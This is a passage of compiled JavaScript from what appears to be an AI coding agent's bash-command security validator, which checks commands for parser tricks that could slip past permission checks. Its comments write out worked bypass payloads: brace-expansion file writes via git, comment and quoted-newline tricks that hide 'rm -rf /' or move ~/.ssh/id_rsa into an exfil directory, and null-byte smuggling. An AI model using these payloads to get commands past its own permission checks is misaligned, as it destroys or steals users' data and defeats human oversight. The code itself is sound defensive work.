        // Quote toggles come AFTER backslash handling (backslash already skipped
        // any escaped quote char, so these toggles only fire on unescaped quotes).
        if (char === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            continue;
        }
        if (char === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            continue;
        }
    }
    return false;
}
function validateBackslashEscapedOperators(context) {
    // Tree-sitter path: if tree-sitter confirms no actual operator nodes exist
    // in the AST, then any \; is just an escaped character in a word argument
    // (e.g., `find . -exec cmd {} \;`). Skip the expensive regex check.
    if (context.treeSitter && !context.treeSitter.hasActualOperatorNodes) {
        return { behavior: 'passthrough', message: 'No operator nodes in AST' };
    }
    if (hasBackslashEscapedOperator(context.originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_OPERATORS,
        });
        return {
            behavior: 'ask',
            message: 'Command contains a backslash before a shell operator (;, |, &, <, >) which can hide command structure',
        };
    }
    return {
        behavior: 'passthrough',
        message: 'No backslash-escaped operators',
    };
}
/**
 * Checks if a character at position `pos` in `content` is escaped by counting
 * consecutive backslashes before it. An odd number means it's escaped.
 */
function isEscapedAtPosition(content, pos) {
    var backslashCount = 0;
    var i = pos - 1;
    while (i >= 0 && content[i] === '\\') {
        backslashCount++;
        i--;
    }
    return backslashCount % 2 === 1;
}
/**
 * Detects unquoted brace expansion syntax that Bash expands but shell-quote/tree-sitter
 * treat as literal strings. This parsing discrepancy allows permission bypass:
 *   git ls-remote {--upload-pack="touch /tmp/test",test}
 * Parser sees one literal arg, but Bash expands to: --upload-pack="touch /tmp/test" test
 *
 * Brace expansion has two forms:
 *   1. Comma-separated: {a,b,c} → a b c
 *   2. Sequence: {1..5} → 1 2 3 4 5
 *
 * Both single and double quotes suppress brace expansion in Bash, so we use
 * fullyUnquotedContent which has both quote types stripped.
 * Backslash-escaped braces (\{, \}) also suppress expansion.
 */
function validateBraceExpansion(context) {
    // Use pre-strip content to avoid false negatives from stripSafeRedirections
    // creating backslash adjacencies (e.g., `\>/dev/null{a,b}` → `\{a,b}` after
    // stripping, making isEscapedAtPosition think the brace is escaped).
    var content = context.fullyUnquotedPreStrip;
    // SECURITY: Check for MISMATCHED brace counts in fullyUnquoted content.
    // A mismatch indicates that quoted braces (e.g., `'{'` or `"{"`) were
    // stripped by extractQuotedContent, leaving unbalanced braces in the content
    // we analyze. Our depth-matching algorithm below assumes balanced braces —
    // with a mismatch, it closes at the WRONG position, missing commas that
    // bash's algorithm WOULD find.
    //
    // Exploit: `git diff {@'{'0},--output=/tmp/pwned}`
    //   - Original: 2 `{`, 2 `}` (quoted `'{'` counts as content, not operator)
    //   - fullyUnquoted: `git diff {@0},--output=/tmp/pwned}` — 1 `{`, 2 `}`!
    //   - Our depth-matcher: closes at first `}` (after `0`), inner=`@0`, no `,`
    //   - Bash (on original): quoted `{` is content; first unquoted `}` has no
    //     `,` yet → bash treats as literal content, keeps scanning → finds `,`
    //     → final `}` closes → expands to `@{0} --output=/tmp/pwned`
    //   - git writes diff to /tmp/pwned. ARBITRARY FILE WRITE, ZERO PERMISSIONS.
    //
    // We count ONLY unescaped braces (backslash-escaped braces are literal in
    // bash). If counts mismatch AND at least one unescaped `{` exists, block —
    // our depth-matching cannot be trusted on this content.
    var unescapedOpenBraces = 0;
    var unescapedCloseBraces = 0;
    for (var i = 0; i < content.length; i++) {
        if (content[i] === '{' && !isEscapedAtPosition(content, i)) {
            unescapedOpenBraces++;
        }
        else if (content[i] === '}' && !isEscapedAtPosition(content, i)) {
            unescapedCloseBraces++;
        }
    }
    // Only block when CLOSE count EXCEEDS open count — this is the specific
    // attack signature. More `}` than `{` means a quoted `{` was stripped
    // (bash saw it as content, we see extra `}` unaccounted for). The inverse
    // (more `{` than `}`) is usually legitimate unclosed/escaped braces like
    // `{foo` or `{a,b\}` where bash doesn't expand anyway.
    if (unescapedOpenBraces > 0 && unescapedCloseBraces > unescapedOpenBraces) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
            subId: 2,
        });
        return {
            behavior: 'ask',
            message: 'Command has excess closing braces after quote stripping, indicating possible brace expansion obfuscation',
        };
    }
    // SECURITY: Additionally, check the ORIGINAL command (before quote stripping)
    // for `'{'` or `"{"` INSIDE an unquoted brace context — this is the specific
    // attack primitive. A quoted brace inside an outer unquoted `{...}` is
    // essentially always an obfuscation attempt; legitimate commands don't nest
    // quoted braces inside brace expansion (awk/find patterns are fully quoted,
    // like `awk '{print $1}'` where the OUTER brace is inside quotes too).
    //
    // This catches the attack even if an attacker crafts a payload with balanced
    // stripped braces (defense-in-depth). We use a simple heuristic: if the
    // original command has `'{'` or `'}'` or `"{"` or `"}"` (quoted single brace)
    // AND also has an unquoted `{`, that's suspicious.
    if (unescapedOpenBraces > 0) {
        var orig = context.originalCommand;
        // Look for quoted single-brace patterns: '{', '}', "{",  "}"
        // These are the attack primitive — a brace char wrapped in quotes.
        if (/['"][{}]['"]/.test(orig)) {
            (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
                subId: 3,
            });
            return {
                behavior: 'ask',
                message: 'Command contains quoted brace character inside brace context (potential brace expansion obfuscation)',
            };
        }
    }
    // Scan for unescaped `{` characters, then check if they form brace expansion.
    // We use a manual scan rather than a simple regex lookbehind because
    // lookbehinds can't handle double-escaped backslashes (\\{ is unescaped `{`).
    for (var i = 0; i < content.length; i++) {
        if (content[i] !== '{')
            continue;
        if (isEscapedAtPosition(content, i))
            continue;
        // Find matching unescaped `}` by tracking nesting depth.
        // Previous approach broke on nested `{`, missing commas between the outer
        // `{` and the nested one (e.g., `{--upload-pack="evil",{test}}`).
        var depth = 1;
        var matchingClose = -1;
        for (var j = i + 1; j < content.length; j++) {
            var ch = content[j];
            if (ch === '{' && !isEscapedAtPosition(content, j)) {
                depth++;
            }
            else if (ch === '}' && !isEscapedAtPosition(content, j)) {
                depth--;
                if (depth === 0) {
                    matchingClose = j;
                    break;
                }
            }
        }
        if (matchingClose === -1)
            continue;
        // Check for `,` or `..` at the outermost nesting level between this
        // `{` and its matching `}`. Only depth-0 triggers matter — bash splits
        // brace expansion at outer-level commas/sequences.
        var innerDepth = 0;
        for (var k = i + 1; k < matchingClose; k++) {
            var ch = content[k];
            if (ch === '{' && !isEscapedAtPosition(content, k)) {
                innerDepth++;
            }
            else if (ch === '}' && !isEscapedAtPosition(content, k)) {
                innerDepth--;
            }
            else if (innerDepth === 0) {
                if (ch === ',' ||
                    (ch === '.' && k + 1 < matchingClose && content[k + 1] === '.')) {
                    (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                        checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
                        subId: 1,
                    });
                    return {
                        behavior: 'ask',
                        message: 'Command contains brace expansion that could alter command parsing',
                    };
                }
            }
        }
        // No expansion at this level — don't skip past; inner pairs will be
        // caught by subsequent iterations of the outer loop.
    }
    return {
        behavior: 'passthrough',
        message: 'No brace expansion detected',
    };
}
// Matches Unicode whitespace characters that shell-quote treats as word
// separators but bash treats as literal word content. While this differential
// is defense-favorable (shell-quote over-splits), blocking these proactively
// prevents future edge cases.
// eslint-disable-next-line no-misleading-character-class
var UNICODE_WS_RE = /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/;
function validateUnicodeWhitespace(context) {
    var originalCommand = context.originalCommand;
    if (UNICODE_WS_RE.test(originalCommand)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.UNICODE_WHITESPACE,
        });
        return {
            behavior: 'ask',
            message: 'Command contains Unicode whitespace characters that could cause parsing inconsistencies',
        };
    }
    return { behavior: 'passthrough', message: 'No Unicode whitespace' };
}
function validateMidWordHash(context) {
    var unquotedKeepQuoteChars = context.unquotedKeepQuoteChars;
    // Match # preceded by a non-whitespace character (mid-word hash).
    // shell-quote treats mid-word # as comment-start but bash treats it as a
    // literal character, creating a parser differential.
    //
    // Uses unquotedKeepQuoteChars (which preserves quote delimiters but strips
    // quoted content) to catch quote-adjacent # like 'x'# — fullyUnquotedPreStrip
    // would strip both quotes and content, turning 'x'# into just # (word-start).
    //
    // SECURITY: Also check the CONTINUATION-JOINED version. The context is built
    // from the original command (pre-continuation-join). For `foo\<NL>#bar`,
    // pre-join the `#` is preceded by `\n` (whitespace → `/\S#/` doesn't match),
    // but post-join it's preceded by `o` (non-whitespace → matches). shell-quote
    // operates on the post-join text (line continuations are joined in
    // splitCommand), so the parser differential manifests on the joined text.
    // While not directly exploitable (the `#...` fragment still prompts as its
    // own subcommand), this is a defense-in-depth gap — shell-quote would drop
    // post-`#` content from path extraction.
    //
    // Exclude ${# which is bash string-length syntax (e.g., ${#var}).
    // Note: the lookbehind must be placed immediately before # (not before \S)
    // so that it checks the correct 2-char window.
    var joined = unquotedKeepQuoteChars.replace(/\\+\n/g, function (match) {
        var backslashCount = match.length - 1;
        return backslashCount % 2 === 1 ? '\\'.repeat(backslashCount - 1) : match;
    });
    if (
    // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() with atom search: fast when # absent
    /\S(?<!\$\{)#/.test(unquotedKeepQuoteChars) ||
        // eslint-disable-next-line custom-rules/no-lookbehind-regex -- same as above
        /\S(?<!\$\{)#/.test(joined)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.MID_WORD_HASH,
        });
        return {
            behavior: 'ask',
            message: 'Command contains mid-word # which is parsed differently by shell-quote vs bash',
        };
    }
    return { behavior: 'passthrough', message: 'No mid-word hash' };
}
/**
 * Detects when a `#` comment contains quote characters that would desync
 * downstream quote trackers (like extractQuotedContent).
 *
 * In bash, everything after an unquoted `#` on a line is a comment — quote
 * characters inside the comment are literal text, not quote toggles. But our
 * quote-tracking functions don't handle comments, so a `'` or `"` after `#`
 * toggles their quote state. Attackers can craft `# ' "` sequences that
 * precisely desync the tracker, causing subsequent content (on following
 * lines) to appear "inside quotes" when it's actually unquoted in bash.
 *
 * Example attack:
 *   echo "it's" # ' " <<'MARKER'\n
 *   rm -rf /\n
 *   MARKER
 * In bash: `#` starts a comment, `rm -rf /` executes on line 2.
 * In extractQuotedContent: the `'` at position 14 (after #) opens a single
 * quote, and the `'` before MARKER closes it. But the `'` after MARKER opens
 * ANOTHER single quote, swallowing the newline and `rm -rf /`, so
 * validateNewlines sees no unquoted newlines.
 *
 * Defense: If we see an unquoted `#` followed by any quote character on the
 * same line, treat it as a misparsing concern. Legitimate commands rarely
 * have quote characters in their comments (and if they do, the user can
 * approve manually).
 */
function validateCommentQuoteDesync(context) {
    // Tree-sitter path: tree-sitter correctly identifies comment nodes and
    // quoted content. The desync concern is about regex quote tracking being
    // confused by quote characters inside comments. When tree-sitter provides
    // the quote context, this desync cannot happen — the AST is authoritative
    // regardless of whether the command contains a comment.
    if (context.treeSitter) {
        return {
            behavior: 'passthrough',
            message: 'Tree-sitter quote context is authoritative',
        };
    }
    var originalCommand = context.originalCommand;
    // Track quote state character-by-character using the same (correct) logic
    // as extractQuotedContent: single quotes don't toggle inside double quotes.
    // When we encounter an unquoted `#`, check if the rest of the line (until
    // newline) contains any quote characters.
    var inSingleQuote = false;
    var inDoubleQuote = false;
    var escaped = false;
    for (var i = 0; i < originalCommand.length; i++) {
        var char = originalCommand[i];
        if (escaped) {
            escaped = false;
            continue;
        }
        if (inSingleQuote) {
            if (char === "'")
                inSingleQuote = false;
            continue;
        }
        if (char === '\\') {
            escaped = true;
            continue;
        }
        if (inDoubleQuote) {
            if (char === '"')
                inDoubleQuote = false;
            // Single quotes inside double quotes are literal — no toggle
            continue;
        }
        if (char === "'") {
            inSingleQuote = true;
            continue;
        }
        if (char === '"') {
            inDoubleQuote = true;
            continue;
        }
        // Unquoted `#` — in bash, this starts a comment. Check if the rest of
        // the line contains quote characters that would desync other trackers.
        if (char === '#') {
            var lineEnd = originalCommand.indexOf('\n', i);
            var commentText = originalCommand.slice(i + 1, lineEnd === -1 ? originalCommand.length : lineEnd);
            if (/['"]/.test(commentText)) {
                (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                    checkId: BASH_SECURITY_CHECK_IDS.COMMENT_QUOTE_DESYNC,
                });
                return {
                    behavior: 'ask',
                    message: 'Command contains quote characters inside a # comment which can desync quote tracking',
                };
            }
            // Skip to end of line (rest is comment)
            if (lineEnd === -1)
                break;
            i = lineEnd; // Loop increment will move past newline
        }
    }
    return { behavior: 'passthrough', message: 'No comment quote desync' };
}
/**
 * Detects a newline inside a quoted string where the NEXT line would be
 * stripped by stripCommentLines (trimmed line starts with `#`).
 *
 * In bash, `\n` inside quotes is a literal character and part of the argument.
 * But stripCommentLines (called by stripSafeWrappers in bashPermissions before
 * path validation and rule matching) processes commands LINE-BY-LINE via
 * `command.split('\n')` without tracking quote state. A quoted newline lets an
 * attacker position the next line to start with `#` (after trim), causing
 * stripCommentLines to drop that line entirely — hiding sensitive paths or
 * arguments from path validation and permission rule matching.
 *
 * Example attack (auto-allowed in acceptEdits mode without any Bash rules):
 *   mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir
 * Bash: moves ./decoy AND ~/.ssh/id_rsa into ./exfil_dir/ (errors on `\n#`).
 * stripSafeWrappers: line 2 starts with `#` → stripped → "mv ./decoy '".
 * shell-quote: drops unbalanced trailing quote → ["mv", "./decoy"].
 * checkPathConstraints: only sees ./decoy (in cwd) → passthrough.
 * acceptEdits mode: mv with all-cwd paths → ALLOW. Zero clicks, no warning.
 *
 * Also works with cp (exfil), rm/rm -rf (delete arbitrary files/dirs).
 *
 * Defense: block ONLY the specific stripCommentLines trigger — a newline inside
 * quotes where the next line starts with `#` after trim. This is the minimal
 * check that catches the parser differential while preserving legitimate
 * multi-line quoted arguments (echo 'line1\nline2', grep patterns, etc.).
 * Safe heredocs ($(cat <<'EOF'...)) and git commit -m "..." are handled by
 * early validators and never reach this check.
 *
 * This validator is NOT in nonMisparsingValidators — its ask result gets
 * isBashSecurityCheckForMisparsing: true, causing an early block in the
 * permission flow at bashPermissions.ts before any line-based processing runs.
 */
function validateQuotedNewline(context) {
    var originalCommand = context.originalCommand;
    // Fast path: must have both a newline byte AND a # character somewhere.
    // stripCommentLines only strips lines where trim().startsWith('#'), so
    // no # means no possible trigger.
    if (!originalCommand.includes('\n') || !originalCommand.includes('#')) {
        return { behavior: 'passthrough', message: 'No newline or no hash' };
    }
    // Track quote state. Mirrors extractQuotedContent / validateCommentQuoteDesync:
    // - single quotes don't toggle inside double quotes
    // - backslash escapes the next char (but not inside single quotes)
    // stripCommentLines splits on '\n' (not \r), so we only treat \n as a line
    // separator. \r inside a line is removed by trim() and doesn't change the
    // trimmed-starts-with-# check.
    var inSingleQuote = false;
    var inDoubleQuote = false;
    var escaped = false;
    for (var i = 0; i < originalCommand.length; i++) {
        var char = originalCommand[i];
        if (escaped) {
            escaped = false;
            continue;
        }
        if (char === '\\' && !inSingleQuote) {
            escaped = true;
            continue;
        }
        if (char === "'" && !inDoubleQuote) {
            inSingleQuote = !inSingleQuote;
            continue;
        }
        if (char === '"' && !inSingleQuote) {
            inDoubleQuote = !inDoubleQuote;
            continue;
        }
        // A newline inside quotes: the NEXT line (from bash's perspective) starts
        // inside a quoted string. Check if that line would be stripped by
        // stripCommentLines — i.e., after trim(), does it start with `#`?
        // This exactly mirrors: lines.filter(l => !l.trim().startsWith('#'))
        if (char === '\n' && (inSingleQuote || inDoubleQuote)) {
            var lineStart = i + 1;
            var nextNewline = originalCommand.indexOf('\n', lineStart);
            var lineEnd = nextNewline === -1 ? originalCommand.length : nextNewline;
            var nextLine = originalCommand.slice(lineStart, lineEnd);
            if (nextLine.trim().startsWith('#')) {
                (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                    checkId: BASH_SECURITY_CHECK_IDS.QUOTED_NEWLINE,
                });
                return {
                    behavior: 'ask',
                    message: 'Command contains a quoted newline followed by a #-prefixed line, which can hide arguments from line-based permission checks',
                };
            }
        }
    }
    return { behavior: 'passthrough', message: 'No quoted newline-hash pattern' };
}
/**
 * Validates that the command doesn't use Zsh-specific dangerous commands that
 * can bypass security checks. These commands provide capabilities like loading
 * kernel modules, raw file I/O, network access, and pseudo-terminal execution
 * that circumvent normal permission checks.
 *
 * Also catches `fc -e` which can execute arbitrary editors on command history,
 * and `emulate` which with `-c` is an eval-equivalent.
 */
function validateZshDangerousCommands(context) {
    var originalCommand = context.originalCommand;
    // Extract the base command from the original command, stripping leading
    // whitespace, env var assignments, and Zsh precommand modifiers.
    // e.g., "FOO=bar command builtin zmodload" -> "zmodload"
    var ZSH_PRECOMMAND_MODIFIERS = new Set([
        'command',
        'builtin',
        'noglob',
        'nocorrect',
    ]);
    var trimmed = originalCommand.trim();
    var tokens = trimmed.split(/\s+/);
    var baseCmd = '';
    for (var _i = 0, tokens_1 = tokens; _i < tokens_1.length; _i++) {
        var token = tokens_1[_i];
        // Skip env var assignments (VAR=value)
        if (/^[A-Za-z_]\w*=/.test(token))
            continue;
        // Skip Zsh precommand modifiers (they don't change what command runs)
        if (ZSH_PRECOMMAND_MODIFIERS.has(token))
            continue;
        baseCmd = token;
        break;
    }
    if (ZSH_DANGEROUS_COMMANDS.has(baseCmd)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
            subId: 1,
        });
        return {
            behavior: 'ask',
            message: "Command uses Zsh-specific '".concat(baseCmd, "' which can bypass security checks"),
        };
    }
    // Check for `fc -e` which allows executing arbitrary commands via editor
    // fc without -e is safe (just lists history), but -e specifies an editor
    // to run on the command, effectively an eval
    if (baseCmd === 'fc' && /\s-\S*e/.test(trimmed)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.ZSH_DANGEROUS_COMMANDS,
            subId: 2,
        });
        return {
            behavior: 'ask',
            message: "Command uses 'fc -e' which can execute arbitrary commands via editor",
        };
    }
    return {
        behavior: 'passthrough',
        message: 'No Zsh dangerous commands',
    };
}
// Matches non-printable control characters that have no legitimate use in shell
// commands: 0x00-0x08, 0x0B-0x0C, 0x0E-0x1F, 0x7F. Excludes tab (0x09),
// newline (0x0A), and carriage return (0x0D) which are handled by other
// validators. Bash silently drops null bytes and ignores most control chars,
// so an attacker can use them to slip metacharacters past our checks while
// bash still executes them (e.g., "echo safe\x00; rm -rf /").
// eslint-disable-next-line no-control-regex
var CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/;
/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 */
function bashCommandIsSafe_DEPRECATED(command) {
    var _a, _b;
    // SECURITY: Block control characters before any other processing. Null bytes
    // and other non-printable chars are silently dropped by bash but confuse our
    // validators, allowing metacharacters adjacent to them to slip through.
    if (CONTROL_CHAR_RE.test(command)) {
        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
            checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
        });
        return {
            behavior: 'ask',
            message: 'Command contains non-printable control characters that could be used to bypass security checks',
            isBashSecurityCheckForMisparsing: true,
        };
    }
    // SECURITY: Detect '\' patterns that exploit shell-quote's incorrect handling
    // of backslashes inside single quotes. Must run before shell-quote parsing.
    if ((0, shellQuote_js_1.hasShellQuoteSingleQuoteBug)(command)) {
        return {
            behavior: 'ask',
            message: 'Command contains single-quoted backslash pattern that could bypass security checks',
            isBashSecurityCheckForMisparsing: true,
        };
    }
    // SECURITY: Strip heredoc bodies before running security validators.
    // Only strip bodies for quoted/escaped delimiters (<<'EOF', <<\EOF) where
    // the body is literal text — $(), backticks, and ${} are NOT expanded.
    // Unquoted heredocs (<<EOF) undergo full shell expansion, so their bodies
    // may contain executable command substitutions that validators must see.
    // When extractHeredocs bails out (can't parse safely), the raw command
    // goes through all validators — which is the safe direction.
    var processedCommand = (0, heredoc_js_1.extractHeredocs)(command, { quotedOnly: true }).processedCommand;
    var baseCommand = command.split(' ')[0] || '';
    var _c = extractQuotedContent(processedCommand, baseCommand === 'jq'), withDoubleQuotes = _c.withDoubleQuotes, fullyUnquoted = _c.fullyUnquoted, unquotedKeepQuoteChars = _c.unquotedKeepQuoteChars;
    var context = {
        originalCommand: command,
        baseCommand: baseCommand,
        unquotedContent: withDoubleQuotes,
        fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
        fullyUnquotedPreStrip: fullyUnquoted,
        unquotedKeepQuoteChars: unquotedKeepQuoteChars,
    };
    var earlyValidators = [
        validateEmpty,
        validateIncompleteCommands,
        validateSafeCommandSubstitution,
        validateGitCommit,
    ];
    for (var _i = 0, earlyValidators_1 = earlyValidators; _i < earlyValidators_1.length; _i++) {
        var validator = earlyValidators_1[_i];
        var result = validator(context);
        if (result.behavior === 'allow') {
            return {
                behavior: 'passthrough',
                message: ((_a = result.decisionReason) === null || _a === void 0 ? void 0 : _a.type) === 'other' ||
                    ((_b = result.decisionReason) === null || _b === void 0 ? void 0 : _b.type) === 'safetyCheck'
                    ? result.decisionReason.reason
                    : 'Command allowed',
            };
        }
        if (result.behavior !== 'passthrough') {
            return result.behavior === 'ask'
                ? __assign(__assign({}, result), { isBashSecurityCheckForMisparsing: true }) : result;
        }
    }
    // Validators that don't set isBashSecurityCheckForMisparsing — their ask
    // results go through the standard permission flow rather than being blocked
    // early. LF newlines and redirections are normal patterns that splitCommand
    // handles correctly, not misparsing concerns.
    //
    // NOTE: validateCarriageReturn is NOT here — CR IS a misparsing concern.
    // shell-quote's `[^\s]` treats CR as a word separator (JS `\s` ⊃ \r), but
    // bash IFS does NOT include CR. splitCommand collapses CR→space, which IS
    // misparsing. See validateCarriageReturn for the full attack trace.
    var nonMisparsingValidators = new Set([
        validateNewlines,
        validateRedirections,
    ]);
    var validators = [
        validateJqCommand,
        validateObfuscatedFlags,
        validateShellMetacharacters,
        validateDangerousVariables,
        // Run comment-quote-desync BEFORE validateNewlines: it detects cases where
        // the quote tracker would miss newlines due to # comment desync.
        validateCommentQuoteDesync,
        // Run quoted-newline BEFORE validateNewlines: it detects the INVERSE case
        // (newlines INSIDE quotes, which validateNewlines ignores by design). Quoted
        // newlines let attackers split commands across lines so that line-based
        // processing (stripCommentLines) drops sensitive content.
        validateQuotedNewline,
        // CR check runs BEFORE validateNewlines — CR is a MISPARSING concern
        // (shell-quote/bash tokenization differential), LF is not.
        validateCarriageReturn,
        validateNewlines,
        validateIFSInjection,
        validateProcEnvironAccess,
        validateDangerousPatterns,
        validateRedirections,
        validateBackslashEscapedWhitespace,
        validateBackslashEscapedOperators,
        validateUnicodeWhitespace,
        validateMidWordHash,
        validateBraceExpansion,
        validateZshDangerousCommands,
        // Run malformed token check last - other validators should catch specific patterns first
        // (e.g., $() substitution, backticks, etc.) since they have more precise error messages
        validateMalformedTokenInjection,
    ];
    // SECURITY: We must NOT short-circuit when a non-misparsing validator
    // returns 'ask' if there are still misparsing validators later in the list.
    // Non-misparsing ask results are discarded at bashPermissions.ts:~1301-1303
    // (the gate only blocks when isBashSecurityCheckForMisparsing is set). If
    // validateRedirections (index 10, non-misparsing) fires first on `>`, it
    // returns ask-without-flag — but validateBackslashEscapedOperators (index 12,
    // misparsing) would have caught `\;` WITH the flag. Short-circuiting lets a
    // payload like `cat safe.txt \; echo /etc/passwd > ./out` slip through.
    //
    // Fix: defer non-misparsing ask results. Continue running validators; if any
    // misparsing validator fires, return THAT (with the flag). Only if we reach
    // the end without a misparsing ask, return the deferred non-misparsing ask.
    var deferredNonMisparsingResult = null;
    for (var _d = 0, validators_1 = validators; _d < validators_1.length; _d++) {
        var validator = validators_1[_d];
        var result = validator(context);
        if (result.behavior === 'ask') {
            if (nonMisparsingValidators.has(validator)) {
                if (deferredNonMisparsingResult === null) {
                    deferredNonMisparsingResult = result;
                }
                continue;
            }
            return __assign(__assign({}, result), { isBashSecurityCheckForMisparsing: true });
        }
    }
    if (deferredNonMisparsingResult !== null) {
        return deferredNonMisparsingResult;
    }
    return {
        behavior: 'passthrough',
        message: 'Command passed all security checks',
    };
}
/**
 * @deprecated Legacy regex/shell-quote path. Only used when tree-sitter is
 * unavailable. The primary gate is parseForSecurity (ast.ts).
 *
 * Async version of bashCommandIsSafe that uses tree-sitter when available
 * for more accurate parsing. Falls back to the sync regex version when
 * tree-sitter is not available.
 *
 * This should be used by async callers (bashPermissions.ts, bashCommandHelpers.ts).
 * Sync callers (readOnlyValidation.ts) should continue using bashCommandIsSafe().
 */
function bashCommandIsSafeAsync_DEPRECATED(command, onDivergence) {
    return __awaiter(this, void 0, void 0, function () {
        var parsed, tsAnalysis, processedCommand, baseCommand, tsQuote, regexQuote, withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars, context, hasDivergence, earlyValidators, _i, earlyValidators_2, validator, result, nonMisparsingValidators, validators, deferredNonMisparsingResult, _a, validators_2, validator, result;
        var _b, _c, _d;
        return __generator(this, function (_e) {
            switch (_e.label) {
                case 0: return [4 /*yield*/, ParsedCommand_js_1.ParsedCommand.parse(command)];
                case 1:
                    parsed = _e.sent();
                    tsAnalysis = (_b = parsed === null || parsed === void 0 ? void 0 : parsed.getTreeSitterAnalysis()) !== null && _b !== void 0 ? _b : null;
                    // If no tree-sitter, fall back to sync version
                    if (!tsAnalysis) {
                        return [2 /*return*/, bashCommandIsSafe_DEPRECATED(command)];
                    }
                    // Run the same security checks but with tree-sitter enriched context.
                    // The early checks (control chars, shell-quote bug) don't benefit from
                    // tree-sitter, so we run them identically.
                    if (CONTROL_CHAR_RE.test(command)) {
                        (0, index_js_1.logEvent)('tengu_bash_security_check_triggered', {
                            checkId: BASH_SECURITY_CHECK_IDS.CONTROL_CHARACTERS,
                        });
                        return [2 /*return*/, {
                                behavior: 'ask',
                                message: 'Command contains non-printable control characters that could be used to bypass security checks',
                                isBashSecurityCheckForMisparsing: true,
                            }];
                    }
                    if ((0, shellQuote_js_1.hasShellQuoteSingleQuoteBug)(command)) {
                        return [2 /*return*/, {
                                behavior: 'ask',
                                message: 'Command contains single-quoted backslash pattern that could bypass security checks',
                                isBashSecurityCheckForMisparsing: true,
                            }];
                    }
                    processedCommand = (0, heredoc_js_1.extractHeredocs)(command, { quotedOnly: true }).processedCommand;
                    baseCommand = command.split(' ')[0] || '';
                    tsQuote = tsAnalysis.quoteContext;
                    regexQuote = extractQuotedContent(processedCommand, baseCommand === 'jq');
                    withDoubleQuotes = tsQuote.withDoubleQuotes;
                    fullyUnquoted = tsQuote.fullyUnquoted;
                    unquotedKeepQuoteChars = tsQuote.unquotedKeepQuoteChars;
                    context = {
                        originalCommand: command,
                        baseCommand: baseCommand,
                        unquotedContent: withDoubleQuotes,
                        fullyUnquotedContent: stripSafeRedirections(fullyUnquoted),
                        fullyUnquotedPreStrip: fullyUnquoted,
                        unquotedKeepQuoteChars: unquotedKeepQuoteChars,
                        treeSitter: tsAnalysis,
                    };
                    // Log divergence between tree-sitter and regex quote extraction.
                    // Skip for heredoc commands: tree-sitter strips (quoted) heredoc bodies
                    // to nothing while the regex path replaces them with placeholder strings
                    // (via extractHeredocs), so the two outputs can never match. Logging
                    // divergence for every heredoc command would poison the signal.
                    //
                    // onDivergence callback: when called in a fanout loop (bashPermissions.ts
                    // Promise.all over subcommands), the caller batches divergences into a
                    // single logEvent instead of N separate calls. Each logEvent triggers
                    // getEventMetadata() → buildProcessMetrics() → process.memoryUsage() →
                    // /proc/self/stat read; with memoized metadata these resolve as microtasks
                    // and starve the event loop (CC-643). Single-command callers omit the
                    // callback and get the original per-call logEvent behavior.
                    if (!tsAnalysis.dangerousPatterns.hasHeredoc) {
                        hasDivergence = tsQuote.fullyUnquoted !== regexQuote.fullyUnquoted ||
                            tsQuote.withDoubleQuotes !== regexQuote.withDoubleQuotes;
                        if (hasDivergence) {
                            if (onDivergence) {
                                onDivergence();
                            }
                            else {
                                (0, index_js_1.logEvent)('tengu_tree_sitter_security_divergence', {
                                    quoteContextDivergence: true,
                                });
                            }
                        }
                    }
                    earlyValidators = [
                        validateEmpty,
                        validateIncompleteCommands,
                        validateSafeCommandSubstitution,
                        validateGitCommit,
                    ];
                    for (_i = 0, earlyValidators_2 = earlyValidators; _i < earlyValidators_2.length; _i++) {
                        validator = earlyValidators_2[_i];
                        result = validator(context);
                        if (result.behavior === 'allow') {
                            return [2 /*return*/, {
                                    behavior: 'passthrough',
                                    message: ((_c = result.decisionReason) === null || _c === void 0 ? void 0 : _c.type) === 'other' ||
                                        ((_d = result.decisionReason) === null || _d === void 0 ? void 0 : _d.type) === 'safetyCheck'
                                        ? result.decisionReason.reason
                                        : 'Command allowed',
                                }];
                        }
                        if (result.behavior !== 'passthrough') {
                            return [2 /*return*/, result.behavior === 'ask'
                                    ? __assign(__assign({}, result), { isBashSecurityCheckForMisparsing: true }) : result];
                        }
                    }
                    nonMisparsingValidators = new Set([
                        validateNewlines,
                        validateRedirections,
                    ]);
                    validators = [
                        validateJqCommand,
                        validateObfuscatedFlags,
                        validateShellMetacharacters,
                        validateDangerousVariables,
                        validateCommentQuoteDesync,
                        validateQuotedNewline,
                        validateCarriageReturn,
                        validateNewlines,
                        validateIFSInjection,
                        validateProcEnvironAccess,
                        validateDangerousPatterns,
                        validateRedirections,
                        validateBackslashEscapedWhitespace,
                        validateBackslashEscapedOperators,
                        validateUnicodeWhitespace,
                        validateMidWordHash,
